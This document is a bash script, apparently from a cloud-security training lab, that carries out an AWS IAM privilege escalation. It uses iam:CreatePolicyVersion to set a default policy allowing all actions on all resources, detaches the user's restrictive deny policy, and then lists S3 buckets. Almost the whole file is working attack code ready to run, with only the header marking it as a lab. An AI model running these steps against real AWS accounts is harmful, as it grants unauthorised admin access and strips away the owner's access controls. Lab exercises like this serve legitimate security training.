#!/bin/bash
###############################################################################
# AWS IAM Privilege Escalation Lab 1.4 - Attack Script (Run as Anchal)
# Objective: Exploit iam:CreatePolicyVersion to bypass restrictive S3 deny policy
###############################################################################

set -euo pipefail

# ─── CONFIGURATION ──────────────────────────────────────────────────────────
PROFILE="anchal-lab"
USERNAME="Anchal"

# ─── COLORS ──────────────────────────────────────────────────────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

log_info()    { echo -e "${BLUE}[*]${NC} $*"; }
log_ok()      { echo -e "${GREEN}[+]${NC} $*"; }
log_warn()    { echo -e "${YELLOW}[i]${NC} $*"; }
log_error()   { echo -e "${RED}[ERROR]${NC} $*"; }

# ─── GET ACCOUNT ID ──────────────────────────────────────────────────────────
log_info "Getting account ID..."
ACCOUNT_ID=$(aws sts get-caller-identity --profile "$PROFILE" --output json 2>/dev/null | jq -r '.AccountId' 2>/dev/null) || {
    log_error "Failed to get caller identity. Are you configured for profile '$PROFILE'?"
    log_error "Run: aws configure --profile $PROFILE"
    exit 1
}
log_ok "Account ID: $ACCOUNT_ID"

ATTACK_POLICY_ARN="arn:aws:iam::$ACCOUNT_ID:policy/anchal-create-version-attack"
RESTRICTIVE_POLICY_ARN="arn:aws:iam::$ACCOUNT_ID:policy/anchal-restrictive-boundary"

# ─── STEP 1: VERIFY S3 IS DENIED ────────────────────────────────────────────
log_info "Step 1: Verifying S3 access is DENIED by restrictive policy..."
if aws s3 ls --profile "$PROFILE" >/dev/null 2>&1; then
    log_warn "S3 access succeeded unexpectedly - restrictive policy may not be attached."
else
    log_ok "S3 access DENIED as expected (explicit deny from restrictive policy)."
fi
echo

# ─── STEP 2: EXPLOIT CreatePolicyVersion ────────────────────────────────────
log_info "Step 2: Exploiting iam:CreatePolicyVersion on vulnerable policy..."
log_info "Target policy: $ATTACK_POLICY_ARN"

ESCALATION_POLICY='{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        }
    ]
}'

if aws iam create-policy-version \
    --policy-arn "$ATTACK_POLICY_ARN" \
    --policy-document "$ESCALATION_POLICY" \
    --set-as-default \
    --profile "$PROFILE" >/dev/null 2>&1; then
    log_ok "Successfully created new policy version with full admin permissions!"
    log_ok "Policy version is now DEFAULT."
else
    log_error "Failed to create policy version. Check permissions."
    exit 1
fi
echo

# ─── STEP 3: DETACH RESTRICTIVE POLICY ──────────────────────────────────────
log_info "Step 3: Detaching restrictive deny policy..."
log_info "Target: $RESTRICTIVE_POLICY_ARN"

if aws iam detach-user-policy \
    --user-name "$USERNAME" \
    --policy-arn "$RESTRICTIVE_POLICY_ARN" \
    --profile "$PROFILE" >/dev/null 2>&1; then
    log_ok "Restrictive policy detached successfully!"
else
    log_error "Failed to detach restrictive policy."
    exit 1
fi
echo

# ─── STEP 4: VERIFY S3 ACCESS RESTORED ──────────────────────────────────────
log_info "Step 4: Verifying S3 access is now RESTORED..."
if aws s3 ls --profile "$PROFILE" >/dev/null 2>&1; then
    log_ok "SUCCESS! S3 access restored. You have escalated privileges!"
    echo
    log_info "Listing buckets:"
    aws s3 ls --profile "$PROFILE"
else
    log_error "S3 access still denied. Something went wrong."
    exit 1
fi

echo
echo "================================================================"
echo "🎯 PRIVILEGE ESCALATION COMPLETE!"
echo "================================================================"
echo "You successfully exploited iam:CreatePolicyVersion to:"
echo "  1. Create a new policy version with *:* permissions"
echo "  2. Make it the default version"
echo "  3. Detach the restrictive deny policy"
echo "  4. Regain full S3 access"
echo "================================================================"